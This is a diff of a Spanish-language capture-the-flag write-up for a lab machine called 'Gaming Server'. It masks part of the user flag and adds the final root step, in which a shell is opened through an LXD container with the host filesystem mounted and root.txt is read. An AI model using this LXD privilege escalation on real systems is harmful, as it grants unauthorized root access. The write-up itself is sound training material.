@@ -195,7 +195,7 @@ Enunciado : Obtener  flags de usuario y root.
     john@exploitable:~$ cd /home/john/
    
     john@exploitable:~$ cat user.txt 
-    a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
+    a5c2ff8b--------------4ff2f1a5a6e7e
 
 -Elevamos privilegios root.
 
@@ -336,6 +336,34 @@ Linux Container Daemon (LXD), es una herramienta de gestión de los contenedores
         | mycontainer | RUNNING | 10.229.116.117 (eth0) | fd42:2998:1e63:3d6f:216:3eff:fef2:c3c4 (eth0) | PERSISTENT | 0         |
 
   -Obtener Root
+  
+        john@exploitable:/tmp$ lxc exec mycontainer /bin/sh
+        ~ # whoami
+        root
+  
+        / # cd mnt/root/root
+  
+        /mnt/root/root # ls -la
+        total 32
+        drwx------    3 root     root          4096 Feb  5  2020 .
+        drwxr-xr-x   24 root     root          4096 Feb  5  2020 ..
+        -rw-------    1 root     root            42 Feb  5  2020 .bash_history
+        -rw-r--r--    1 root     root          3106 Apr  9  2018 .bashrc
+        -rw-r--r--    1 root     root           148 Aug 17  2015 .profile
+        drwx------    2 root     root          4096 Feb  5  2020 .ssh
+        -rw-------    1 root     root          1090 Feb  5  2020 .viminfo
+        -rw-r--r--    1 root     root            33 Feb  5  2020 root.txt
+  
+        /mnt/root/root # cat root.txt
+        2e337b8c9f------------4e6a7c88fc
+
+
+---
+---> Maquina Gaming Server completa. <---
+---
+---
+
+  
 
   
 
